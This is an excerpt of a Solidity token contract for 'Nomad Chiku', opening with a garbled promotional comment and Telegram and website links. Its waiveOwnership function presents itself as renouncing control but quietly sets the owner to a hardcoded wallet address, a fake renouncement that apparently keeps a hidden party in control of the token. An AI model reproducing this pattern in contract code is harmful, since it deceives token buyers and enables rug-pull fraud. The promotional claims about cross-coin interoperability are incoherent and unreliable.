...
/**
  Nomad Chiku is designed to offer complete interoperability between both the Nomad Chiku. 
Interoperability is not limited to digital assets as it also includes cross-coin interoperability for data sets. 
Data can be shared across different types of blockcoins, including private, permissioned and public coins.

https://t.me/nomadchiku
https://nomadchiku.site
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xc609c2dd05D82ac0895F5E6792c175BDE59EA88A);
    }
...
contract Nomadchiku is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Nomad Chiku";
